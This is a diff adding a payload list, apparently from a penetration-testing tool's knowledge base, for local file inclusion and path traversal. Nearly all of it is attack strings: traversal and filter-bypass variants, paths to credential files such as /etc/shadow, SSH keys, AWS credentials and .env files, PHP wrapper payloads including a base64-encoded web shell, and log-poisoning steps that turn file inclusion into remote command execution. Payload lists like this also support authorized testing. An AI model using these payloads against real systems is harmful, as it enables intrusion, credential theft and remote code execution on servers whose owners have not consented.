@@ -1,0 +1,113 @@
+# LFI / Path Traversal Payloads
+# WardenStrike Knowledge Base
+
+# ─── Basic ───────────────────────────────────────────────────────
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+
+# ─── URL Encoding ────────────────────────────────────────────────
+..%2f..%2f..%2fetc%2fpasswd
+..%2F..%2F..%2Fetc%2Fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e/%2e%2e/%2e%2e/etc/passwd
+..%252f..%252f..%252fetc%252fpasswd  (double encoded)
+%252e%252e%252f  (double encoded dot-dot-slash)
+
+# ─── Null byte (PHP < 5.3.4) ─────────────────────────────────────
+../../../etc/passwd%00
+../../../etc/passwd%00.jpg
+../../../etc/passwd\0
+
+# ─── Filter bypass ───────────────────────────────────────────────
+....//....//....//etc/passwd
+..././..././..././etc/passwd
+....\/....\/....\/etc/passwd
+..//..//..//etc/passwd
+
+# ─── Windows ─────────────────────────────────────────────────────
+..\..\..\windows\win.ini
+..\..\..\windows\system32\drivers\etc\hosts
+..\..\..\..\windows\win.ini
+C:\windows\win.ini
+C:/windows/win.ini
+%WINDIR%\win.ini
+../../../windows/win.ini
+..\..\..\boot.ini
+
+# ─── Interesting Linux files ──────────────────────────────────────
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/hostname
+/etc/group
+/etc/issue
+/etc/os-release
+/etc/crontab
+/etc/cron.d/
+/etc/ssh/sshd_config
+/etc/ssh/ssh_config
+/var/log/auth.log
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+/var/log/syslog
+/var/log/mail.log
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/fd/0
+/proc/self/fd/1
+/proc/self/maps
+/proc/net/arp
+/proc/net/tcp
+/tmp/
+/home/
+/root/.bash_history
+/root/.ssh/id_rsa
+/root/.ssh/authorized_keys
+/root/.aws/credentials
+/var/www/html/.env
+/app/.env
+/srv/www/.env
+
+# ─── PHP wrappers ────────────────────────────────────────────────
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=../../config.php
+php://input  (with POST: <?php system($_GET['cmd']); ?>)
+php://filter/convert.base64-encode/resource=/etc/passwd
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+
+# ─── Log poisoning (LFI → RCE) ───────────────────────────────────
+# 1. Poison access log:
+# GET /<?php system($_GET['cmd']); ?> HTTP/1.1
+# 2. Include log:
+/var/log/apache2/access.log&cmd=id
+/var/log/nginx/access.log&cmd=id
+/proc/self/fd/1&cmd=id
+
+# ─── SSH log poisoning ────────────────────────────────────────────
+# 1. ssh '<?php system($_GET["cmd"]); ?>'@target.com
+# 2. LFI /var/log/auth.log
+
+# ─── Mail log poisoning ───────────────────────────────────────────
+# 1. telnet target 25
+# RCPT TO: <?php system($_GET['cmd']); ?>
+# 2. LFI /var/mail/www-data
+
+# ─── ZIP/PHAR wrappers ────────────────────────────────────────────
+zip://path/to/archive.zip%23shell.php
+phar://path/to/archive.phar/shell.php
+
+# ─── Interesting Windows files ───────────────────────────────────
+C:/Windows/System32/drivers/etc/hosts
+C:/Windows/win.ini
+C:/Windows/System32/config/SAM
+C:/Users/Administrator/Desktop/
+C:/inetpub/wwwroot/web.config
+C:/xampp/htdocs/
+C:/wamp/www/
+C:/AppServ/www/
